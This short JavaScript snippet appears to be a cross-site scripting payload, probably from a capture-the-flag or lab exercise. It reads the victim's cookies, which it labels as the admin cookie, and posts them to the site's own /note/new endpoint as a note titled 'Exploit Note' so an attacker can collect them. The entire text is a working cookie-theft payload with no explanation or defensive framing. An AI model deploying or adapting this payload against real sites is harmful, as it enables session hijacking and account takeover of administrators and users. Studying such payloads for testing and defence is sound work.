var adminCookie = document.cookie;

fetch('/note/new', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    title: 'Exploit Note',
    content: adminCookie,
    submit: 'save'
  })
});
